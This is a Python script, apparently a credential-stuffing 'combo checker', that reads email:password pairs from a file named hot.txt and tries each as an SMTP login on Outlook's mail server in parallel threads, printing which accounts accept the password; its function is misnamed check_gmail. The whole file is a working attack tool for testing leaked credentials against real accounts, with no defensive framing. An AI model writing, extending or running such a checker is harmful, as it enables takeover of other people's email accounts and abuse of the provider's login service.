import smtplib
import traceback
import concurrent.futures

def check_gmail(email, password):
    try:
        smtp_server = "smtp-mail.outlook.com"
        smtp_port = 587
        # Set a timeout to prevent it from hanging
        server = smtplib.SMTP(smtp_server, smtp_port, timeout=10)
        server.starttls()
        server.login(email, password)
        server.quit()
        return f"{email}:{password} => Raw response: Login Successful"
    except smtplib.SMTPAuthenticationError as e:
        return f"{email}:{password} => Raw response: {e.smtp_error.decode('utf-8')}"  # Decoding raw SMTP response
    except Exception as e:
        return f"{email}:{password} => Raw response: {str(e)}\n{traceback.format_exc()}"

def process_account(line):
    email, password = line.strip().split(":")
    return check_gmail(email, password)

def main():
    try:
        with open("hot.txt", "r") as f:
            combos = f.readlines()  # Read all email:password combinations

        results = []
        # Use ThreadPoolExecutor to process accounts concurrently
        with concurrent.futures.ThreadPoolExecutor() as executor:
            futures = [executor.submit(process_account, line) for line in combos]
            for future in concurrent.futures.as_completed(futures):
                results.append(future.result())

        for result in results:
            print(result)

    except Exception as e:
        print(f"Error reading file or processing accounts: {str(e)}")

if __name__ == "__main__":
    main()
